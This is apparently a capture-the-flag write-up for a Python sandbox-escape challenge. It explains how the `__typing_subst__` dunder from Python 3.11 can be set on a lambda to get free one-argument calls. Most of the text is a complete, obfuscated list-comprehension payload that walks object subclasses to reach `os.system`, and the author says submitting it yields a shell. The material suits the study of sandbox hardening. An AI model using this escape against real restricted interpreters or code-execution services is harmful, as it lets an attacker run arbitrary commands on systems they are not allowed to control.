# solve

The entire idea revolves around `__typing_subst__` dunder which was added in 3.11 with the big typing overhaul.
See how it's used [here](https://github.com/python/cpython/blob/v3.13.7/Objects/genericaliasobject.c#L500) to understand why this works. It uses a normal getattr on the object rather than a magic function lookup, so you can add this attribute to any mutable object (like a lambda function) and you get a free 1-arg call.

This is just a standard subclasses escape but with \_\_typing_subst\_\_ tech and listcomp var setting:
```py
[[].__class__[x][x.__hash__.__name__[one:][one:][one:][one:][:neg_one][:neg_one]]
for[x]in[[lambda:[]]]
for[x.__typing_subst__]in[[[].__class__.__class__.__subclasses__]]
for[obj]in[[].__class__[x][[].__class__.__base__].__args__]
for[x.__typing_subst__]in[[[].__class__.__len__]]
for[one]in[[].__class__[x][[obj]].__args__]
for[x.__typing_subst__]in[[one.__class__.__neg__]]
for[neg_one]in[[].__class__[x][one].__args__]
for[gvars]in[[obj[neg_one].__call__.__globals__]]
for[x.__typing_subst__]in[[gvars.keys.__name__[one:][one:][::neg_one].__add__]]
for[sys_str]in[[].__class__[x][gvars.keys.__name__[neg_one]].__args__]
for[x.__typing_subst__]in[[gvars[sys_str].modules[one.__pos__.__name__[one:][one:][one:][:neg_one][:neg_one]].system]]
]
```

Just remove the newlines from above and submit it and you get a shell

